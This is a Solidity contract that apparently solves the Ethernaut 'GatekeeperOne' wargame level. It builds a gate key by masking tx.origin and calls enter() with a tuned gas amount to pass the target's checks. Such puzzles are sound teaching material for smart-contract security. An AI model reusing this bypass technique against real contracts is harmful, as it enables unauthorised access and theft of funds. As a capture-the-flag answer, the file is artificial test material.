// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract attackGatekeeperOne {
    GatekeeperOne public target;
    constructor(address _target) {
        target = GatekeeperOne(_target);
    }
    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        target.enter{gas: 8191 * 10 + 256}(gateKey);
    }
}
